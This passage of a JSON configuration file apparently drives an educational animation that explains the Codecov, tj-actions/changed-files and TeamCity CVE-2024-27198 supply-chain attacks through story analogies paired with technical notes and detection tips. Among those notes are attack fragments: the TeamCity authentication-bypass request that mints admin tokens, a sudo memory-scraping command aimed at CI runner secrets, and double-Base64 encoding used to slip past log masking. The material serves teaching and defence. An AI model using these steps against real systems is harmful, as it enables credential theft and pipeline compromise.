          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Env Leak",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1005"
    },
    "step-3": {
      "scenarioId": "codecov-bash-uploader-ci-env-exfil",
      "sectionKey": "step-3",
      "sceneKind": "sup-codecov-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Downstream Private Git Repository Cloning & Signing Key Abuse",
      "storyCue": "Sorting through thousands of stolen customer key rings, the intruder uses automated bot keys to enter downstream companies private blueprint vaults from outside the factory, copying proprietary source designs and harvesting additional signing keys.",
      "technicalCue": "T1078.004 · LATERAL & C2 — Using the harvested CI environment variables (GITHUB_TOKEN, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and…",
      "storyMappings": [
        {
          "storyTerm": "Stolen customer key rings",
          "technicalTerm": "Exfiltrated GITHUB_TOKEN, Personal Access Tokens, and cloud service keys",
          "tone": "amber"
        },
        {
          "storyTerm": "Private blueprint vaults",
          "technicalTerm": "Downstream victim private Git repositories and source archives",
          "tone": "sky"
        },
        {
          "storyTerm": "Entering from outside the factory with bot keys",
          "technicalTerm": "Unauthorized git.clone operations originating from non-CI external IP addresses",
          "tone": "rose"
        },
        {
          "storyTerm": "Additional signing keys harvested inside",
          "technicalTerm": "Secondary supply-chain credentials enabling follow-on enterprise compromises",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-codecov-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Stolen customer key rings",
          "subtitle": "Exfiltrated GITHUB_TOKEN, Personal Access Tokens, and cloud…",
          "tone": "amber"
        },
        {
          "id": "sup-codecov-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Private blueprint vaults",
          "subtitle": "Downstream victim private Git repositories and source archives",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Key Uses",
          "stageTag": "STEP 03 · SETUP",
          "title": "Stolen customer key rings",
          "storyExcerpt": "Sorting through thousands of stolen customer key rings, the intruder uses automated bot keys to enter downstream companies private blueprint vaults from outside the factory, copying proprietary…",
          "technicalParallel": "Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Bot",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Private blueprint vaults",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses private blueprint vaults to advance toward entering from outside the factory with bot keys.",
          "technicalParallel": "Using the harvested CI environment variables (GITHUB_TOKEN, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and cloud…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bot Keys",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Additional signing keys harvested inside",
          "storyExcerpt": "Behind the scenes, additional signing keys harvested inside captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Inspect GitHub Audit Log git.clone and API token usage events originating from IP ranges outside authorized CI/CD runner pools using machine or bot account tokens (revealing post-exfiltration repository…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Script",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Secret Chute",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Env Leak",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1078.004"
    }
  },
  "github-actions-tj-actions-changed-files-cve-2025-30066": {
    "briefing": {
      "scenarioId": "github-actions-tj-actions-changed-files-cve-2025-30066",
      "sectionKey": "briefing",
      "sceneKind": "sup-tjactions-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "GitHub Actions tj-actions/changed-files Runner Memory Dump… — Story-to-Technical Overview",
      "storyCue": "Imagine a busy neighborhood tool library where thousands of workshops borrow the same popular checklist tool by asking for its floating shelf label rather than its permanent serial number. An intruder steals a librarian key, quietly swaps every shelf label to point at a rigged version of the tool, reads every secret combination straight out of each workshop live workbench memory, and prints the doubled-over cipher of those secrets right onto the workshop public bulletin board.",
      "technicalCue": "INITIAL ACCESS: Retroactive Git Tag Repointing to Malicious Commit 0e58ed8 -> CREDENTIAL ACCESS: Sudo Python Execution of memdump.py Against /proc/$pid/mem -> EXFIL & IMPACT: Double-Base64 Secret Exfiltration via Public Build Logs",
      "storyMappings": [
        {
          "storyTerm": "Swapping every floating shelf label to a rigged tool",
          "technicalTerm": "Force-repointing mutable Git tags (v1..v45) to malicious commit 0e58ed8",
          "tone": "amber"
        },
        {
          "storyTerm": "Reading secret combinations from live workbench memory",
          "technicalTerm": "sudo python3 memdump.py scraping /proc/$pid/mem of Runner.Worker",
          "tone": "sky"
        },
        {
          "storyTerm": "Doubled-over cipher printed on the public bulletin board",
          "technicalTerm": "Double-Base64 encoded CI secrets printed straight into public GitHub Actions logs",
          "tone": "rose"
        },
        {
          "storyTerm": "Permanent serial number preventing the swap",
          "technicalTerm": "Pinning workflow actions to immutable 40-character Git commit SHAs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-tjactions-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Swapping every floating shelf label to a…",
          "subtitle": "Force-repointing mutable Git tags (v1..v45) to malicious…",
          "tone": "amber"
        },
        {
          "id": "sup-tjactions-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Reading secret combinations from live…",
          "subtitle": "sudo python3 memdump.py scraping /proc/$pid/mem of Runner.Worker",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Retroactive Git Tag Repointing to Malicious Commit 0e58ed8",
          "storyExcerpt": "Using a stolen librarian pass, the intruder walks along the tool-library shelves and moves every floating version tag onto a single freshly tampered edition of the checklist tool, instantly poisoning…",
          "technicalParallel": "Over 23,000 repositories using syntax like uses: tj-actions/changed-files@v45 immediately pulled the malicious commit dist/index.js bundle on their next CI run without changing a single line of their own…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Live",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "Sudo Python Execution of memdump.py Against /proc/$pid/mem",
          "storyExcerpt": "The next time a downstream workshop runs its automated build, the rigged tool uses the workshop own unlocked master key to peer directly into the live memory notebook of the foreman process, lifting…",
          "technicalParallel": "Even if a workflow step did not explicitly pass a secret into tj-actions/changed-files via env: the parent Runner.Worker process holds job-level secrets and the runner’s ephemeral GITHUB_TOKEN in heap…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Past",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Double-Base64 Secret Exfiltration via Public Build Logs",
          "storyExcerpt": "Instead of sending a noisy delivery truck outside the gates where highway guards would stop it, the rigged tool folds every stolen secret twice in a simple disguise and prints the bundle right onto the…",
          "technicalParallel": "For public repositories with public Actions logs, the attacker simply queried the GitHub REST API to download workflow logs containing the double-Base64 output and decoded the harvested AWS, npm, PyPI…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Shelf Tags",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Runner Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Dump",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "github-actions-tj-actions-changed-files-cve-2025-30066",
      "sectionKey": "step-1",
      "sceneKind": "sup-tjactions-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Retroactive Git Tag Repointing to Malicious Commit 0e58ed8",
      "storyCue": "Using a stolen librarian pass, the intruder walks along the tool-library shelves and moves every floating version tag onto a single freshly tampered edition of the checklist tool, instantly poisoning every workshop that asked for a version name instead of a fixed serial number.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — Using a compromised maintainer PAT, the attacker executed git push origin --tags --force to repoint all mutable Git tags (v1, v35, v44, v45.0.7, etc., which are human-readable Git references…",
      "storyMappings": [
        {
          "storyTerm": "Stolen librarian pass",
          "technicalTerm": "Compromised maintainer GitHub Personal Access Token (PAT)",
          "tone": "amber"
        },
        {
          "storyTerm": "Moving every floating version tag onto a tampered edition",
          "technicalTerm": "git push origin --tags --force repointing tags to commit 0e58ed8",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered checklist tool",
          "technicalTerm": "Backdoored tj-actions/changed-files dist/index.js payload (CVE-2025-30066)",
          "tone": "rose"
        },
        {
          "storyTerm": "Fixed serial number defense",
          "technicalTerm": "Full 40-character immutable Git commit SHA pinning in .github/workflows/*.yml",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-tjactions-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Stolen librarian pass",
          "subtitle": "Compromised maintainer GitHub Personal Access Token (PAT)",
          "tone": "amber"
        },
        {
          "id": "sup-tjactions-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Moving every floating version tag onto a…",
          "subtitle": "git push origin --tags --force repointing tags to commit 0e58ed8",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STEP 01 · SETUP",
          "title": "Stolen librarian pass",
          "storyExcerpt": "Using a stolen librarian pass, the intruder walks along the tool-library shelves and moves every floating version tag onto a single freshly tampered edition of the checklist tool, instantly…",
          "technicalParallel": "Over 23,000 repositories using syntax like uses: tj-actions/changed-files@v45 immediately pulled the malicious commit dist/index.js bundle on their next CI run without changing a single line of their own…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tag Onto",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Moving every floating version tag onto a tampered…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses moving every floating version tag onto a tampered edition to advance toward tampered checklist tool.",
          "technicalParallel": "Using a compromised maintainer PAT, the attacker executed git push origin --tags --force to repoint all mutable Git tags (v1, v35, v44, v45.0.7, etc., which are human-readable Git references that can be…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tool",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Fixed serial number defense",
          "storyExcerpt": "Behind the scenes, fixed serial number defense captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Review GitHub Audit Log events for retroactive force-updated release tags (flagging mutable tag tampering) and run Software Composition Analysis scanners enforcing full 40-character commit SHA pinning…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Shelf Tags",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Runner Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Dump",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "github-actions-tj-actions-changed-files-cve-2025-30066",
      "sectionKey": "step-2",
      "sceneKind": "sup-tjactions-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "Sudo Python Execution of memdump.py Against /proc/$pid/mem",
      "storyCue": "The next time a downstream workshop runs its automated build, the rigged tool uses the workshop own unlocked master key to peer directly into the live memory notebook of the foreman process, lifting every active vault key, shipping pass, and signing code stored in working memory.",
      "technicalCue": "T1003.007 · CREDENTIAL ACCESS — The malicious dist/index.js script executed a Python memory scraper (memdump.py) via sudo python3 (abusing the passwordless sudo privileges granted by default on GitHub-hosted Ubuntu runners)…",
      "storyMappings": [
        {
          "storyTerm": "Workshop unlocked master key",
          "technicalTerm": "Passwordless sudo privileges granted to GitHub-hosted Ubuntu runners",
          "tone": "amber"
        },
        {
          "storyTerm": "Peering into the live memory notebook of the foreman",
          "technicalTerm": "sudo python3 memdump.py reading /proc/[pid]/mem of Runner.Worker",
          "tone": "sky"
        },
        {
          "storyTerm": "Lifted vault keys and shipping passes",
          "technicalTerm": "Plaintext CI/CD secrets (AWS keys, NPM tokens, GITHUB_TOKEN, PATs) in RAM",
          "tone": "rose"
        },
        {
          "storyTerm": "Rigged checklist tool running on the workbench",
          "technicalTerm": "Malicious dist/index.js executing automatically during CI workflow runs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-tjactions-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Workshop unlocked master key",
          "subtitle": "Passwordless sudo privileges granted to GitHub-hosted Ubuntu…",
          "tone": "amber"
        },
        {
          "id": "sup-tjactions-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Peering into the live memory notebook of…",
          "subtitle": "sudo python3 memdump.py reading /proc/[pid]/mem of Runner.Worker",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Next Time",
          "stageTag": "STEP 02 · SETUP",
          "title": "Workshop unlocked master key",
          "storyExcerpt": "The next time a downstream workshop runs its automated build, the rigged tool uses the workshop own unlocked master key to peer directly into the live memory notebook of the foreman process…",
          "technicalParallel": "Even if a workflow step did not explicitly pass a secret into tj-actions/changed-files via env: the parent Runner.Worker process holds job-level secrets and the runner’s ephemeral GITHUB_TOKEN in heap…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Live",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Peering into the live memory notebook of the foreman",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses peering into the live memory notebook of the foreman to advance toward lifted vault keys and shipping passes.",
          "technicalParallel": "The malicious dist/index.js script executed a Python memory scraper (memdump.py) via sudo python3 (abusing the passwordless sudo privileges granted by default on GitHub-hosted Ubuntu runners) to locate…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Keys",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Rigged checklist tool running on the workbench",
          "storyExcerpt": "Behind the scenes, rigged checklist tool running on the workbench captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Deploy Linux eBPF or Harden-Runner egress and process monitors (runtime kernel agents that observe privileged memory reads inside CI runners) alerting on /usr/bin/python3 running as root (UID 0) opening…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Shelf Tags",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Runner Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Dump",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1003.007"
    },
    "step-3": {
      "scenarioId": "github-actions-tj-actions-changed-files-cve-2025-30066",
      "sectionKey": "step-3",
      "sceneKind": "sup-tjactions-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Double-Base64 Secret Exfiltration via Public Build Logs",
      "storyCue": "Instead of sending a noisy delivery truck outside the gates where highway guards would stop it, the rigged tool folds every stolen secret twice in a simple disguise and prints the bundle right onto the workshop public build-log chalkboard so the intruder can quietly read them from across the street.",
      "technicalCue": "T1567 · EXFIL & IMPACT — Rather than making noisy outbound connections to an attacker C2 server that a firewall might block, memdump.py applied double Base64 encoding (base64 | base64, which transforms the byte…",
      "storyMappings": [
        {
          "storyTerm": "Avoiding noisy delivery trucks past highway guards",
          "technicalTerm": "Zero outbound C2 network calls bypassing CI runner egress firewalls",
          "tone": "amber"
        },
        {
          "storyTerm": "Folding every stolen secret twice in a simple disguise",
          "technicalTerm": "Double-Base64 encoding bypassing GitHub Actions single-pass secret masking",
          "tone": "sky"
        },
        {
          "storyTerm": "Public build-log chalkboard",
          "technicalTerm": "Publicly viewable GitHub Actions workflow execution logs",
          "tone": "rose"
        },
        {
          "storyTerm": "Reading secrets quietly from across the street",
          "technicalTerm": "Offline scraping of public repository build logs to harvest leaked tokens",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-tjactions-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Avoiding noisy delivery trucks past…",
          "subtitle": "Zero outbound C2 network calls bypassing CI runner egress…",
          "tone": "amber"
        },
        {
          "id": "sup-tjactions-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Folding every stolen secret twice in a…",
          "subtitle": "Double-Base64 encoding bypassing GitHub Actions single-pass…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Past",
          "stageTag": "STEP 03 · SETUP",
          "title": "Avoiding noisy delivery trucks past highway guards",
          "storyExcerpt": "Instead of sending a noisy delivery truck outside the gates where highway guards would stop it, the rigged tool folds every stolen secret twice in a simple disguise and prints the bundle right…",
          "technicalParallel": "For public repositories with public Actions logs, the attacker simply queried the GitHub REST API to download workflow logs containing the double-Base64 output and decoded the harvested AWS, npm, PyPI…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Folding every stolen secret twice in a simple disguise",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses folding every stolen secret twice in a simple disguise to advance toward public build-log chalkboard.",
          "technicalParallel": "Rather than making noisy outbound connections to an attacker C2 server that a firewall might block, memdump.py applied double Base64 encoding (base64 | base64, which transforms the byte representation…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Stop It",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Reading secrets quietly from across the street",
          "storyExcerpt": "Behind the scenes, reading secrets quietly from across the street captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Scan historical GitHub Actions workflow logs for unusually long double-Base64 strings printed during the tj-actions/changed-files step (which bypass GitHub built-in secret redaction) and immediately…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Shelf Tags",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Runner Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Dump",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1567"
    }
  },
  "jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning": {
    "briefing": {
      "scenarioId": "jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning",
      "sectionKey": "briefing",
      "sceneKind": "sup-teamcity-27198-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "JetBrains TeamCity Auth Bypass (CVE-2024-27198) to CI/CD Build Pipeline… — Story-to-Technical Overview",
      "storyCue": "Imagine a busy automated software factory whose front guard reads the address on an incoming courier slip differently from the back-room receptionist. An outsider addresses a slip to a nonexistent room while tucking an official back-office route behind a semicolon fold, tricking the factory into minting a brand-new administrator keycard, sneaking a poisoned assembly step onto the production conveyor belt, and letting the factory own signing press stamp genuine approval seals onto trojanized customer releases.",
      "technicalCue": "INITIAL ACCESS: Unauthenticated `;.jsp` Matrix Parameter Auth Bypass (CVE-2024-27198) & Admin Token Minting -> EXECUTION: CI/CD Build Step Injection (`/app/rest/buildTypes`) & Signing Key Access -> INITIAL ACCESS: Trojanized Build Compilation, Official Code Signing & Downstream Distribution",
      "storyMappings": [
        {
          "storyTerm": "Nonexistent room slip with a hidden semicolon fold",
          "technicalTerm": "Unauthenticated ?jsp=/app/rest/...;.jsp auth bypass (CVE-2024-27198)",
          "tone": "amber"
        },
        {
          "storyTerm": "Minting a brand-new administrator keycard",
          "technicalTerm": "Creating a privileged TeamCity Bearer access token via REST API",
          "tone": "sky"
        },
        {
          "storyTerm": "Poisoned assembly step on the production conveyor belt",
          "technicalTerm": "Injected malicious build step via /app/rest/buildTypes accessing signing keys",
          "tone": "rose"
        },
        {
          "storyTerm": "Factory signing press stamping genuine approval seals",
          "technicalTerm": "ProdRelease agent compiling and officially code-signing a backdoored release",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-teamcity-27198-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Nonexistent room slip with a hidden…",
          "subtitle": "Unauthenticated ?jsp=/app/rest/...;.jsp auth bypass…",
          "tone": "amber"
        },
        {
          "id": "sup-teamcity-27198-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Minting a brand-new administrator keycard",
          "subtitle": "Creating a privileged TeamCity Bearer access token via REST API",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room Slip",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Unauthenticated `;.jsp` Matrix Parameter Auth Bypass (CVE-2024-27198) & Admin Token Minting",
          "storyExcerpt": "At the factory gate, the intruder hands over a delivery slip addressed to an empty hallway while hiding a private back-office route behind a semicolon trick. The gate guard waves the nonexistent hallway…",
          "technicalParallel": "Under the hood, the observed step executes POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp HTTP/1.1 (which Transmits a crafted HTTP request , POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Onto Belt",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "CI/CD Build Step Injection (`/app/rest/buildTypes`) & Signing Key Access",
          "storyExcerpt": "Walking onto the factory floor with the newly minted admin keycard, the intruder opens the master assembly-line schedule, locates the flagship customer release belt, and inserts a covert extra build step…",
          "technicalParallel": "Under the hood, the observed step executes POST /app/rest/buildTypes/id:ProdRelease/steps HTTP/1.1 (Injects pre-signing command.executable build step) (which Transmits a crafted HTTP request , POST…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Belt",
          "stageTag": "STAGE 03 · INITIAL ACCESS",
          "title": "Trojanized Build Compilation, Official Code Signing & Downstream Distribution",
          "storyExcerpt": "On the next scheduled shipment, the unsuspecting factory robot follows the altered conveyor instructions, welds a hidden backdoor inside the finished product, stamps the company authentic cryptographic…",
          "technicalParallel": "Under the hood, the observed step executes TeamCity Build Agent executes injected step -> Compiles backdoored binary -> signtool.exe sign /tr http://timestamp.digicert.com ReleaseApp.exe (which executes…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Press",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Card",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning",
      "sectionKey": "step-1",
      "sceneKind": "sup-teamcity-27198-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Unauthenticated ;.jsp Matrix Parameter Auth Bypass (CVE-2024-27198) & Admin Token Minting",
      "storyCue": "At the factory gate, the intruder hands over a delivery slip addressed to an empty hallway while hiding a private back-office route behind a semicolon trick. The gate guard waves the nonexistent hallway past the badge booth, while the inside dispatcher faithfully routes the hidden back-office order to mint a fresh master admin keycard.",
      "technicalCue": "T1190 · INITIAL ACCESS — When an unauthenticated HTTP request is sent to a non-existent path with a ?jsp=/app/rest/...;.jsp query parameter on JetBrains TeamCity (< 2023.11.4), web.xml wildcard servlet routing invokes…",
      "storyMappings": [
        {
          "storyTerm": "Empty hallway address with a hidden semicolon trick",
          "technicalTerm": "Non-existent path paired with ?jsp=/app/rest/...;.jsp matrix parameter",
          "tone": "amber"
        },
        {
          "storyTerm": "Gate guard waving the slip past the badge booth",
          "technicalTerm": "TeamCity authentication filter bypassed by CVE-2024-27198 path confusion",
          "tone": "sky"
        },
        {
          "storyTerm": "Fresh master admin keycard minted on demand",
          "technicalTerm": "Newly generated TeamCity administrator Bearer JWT (Authorization: Bearer eyJ0eXAi...)",
          "tone": "rose"
        },
        {
          "storyTerm": "Back-office token desk",
          "technicalTerm": "Unprotected internal /app/rest/users/id:1/tokens REST endpoint",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-teamcity-27198-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Empty hallway address with a hidden…",
          "subtitle": "Non-existent path paired with ?jsp=/app/rest/...;.jsp matrix…",
          "tone": "amber"
        },
        {
          "id": "sup-teamcity-27198-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Gate guard waving the slip past the…",
          "subtitle": "TeamCity authentication filter bypassed by CVE-2024-27198 path…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Gate Over",
          "stageTag": "STEP 01 · SETUP",
          "title": "Empty hallway address with a hidden semicolon trick",
          "storyExcerpt": "At the factory gate, the intruder hands over a delivery slip addressed to an empty hallway while hiding a private back-office route behind a semicolon trick.",
          "technicalParallel": "Under the hood, the observed step executes POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp HTTP/1.1 (which Transmits a crafted HTTP request , POST /hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Gate Slip",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Gate guard waving the slip past the badge booth",
          "storyExcerpt": "The gate guard waves the nonexistent hallway past the badge booth, while the inside dispatcher faithfully routes the hidden back-office order to mint a fresh master admin keycard.",
          "technicalParallel": "When an unauthenticated HTTP request is sent to a non-existent path with a ?jsp=/app/rest/...;.jsp query parameter on JetBrains TeamCity (< 2023.11.4), web.xml wildcard servlet routing invokes JspServlet…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Back-office",
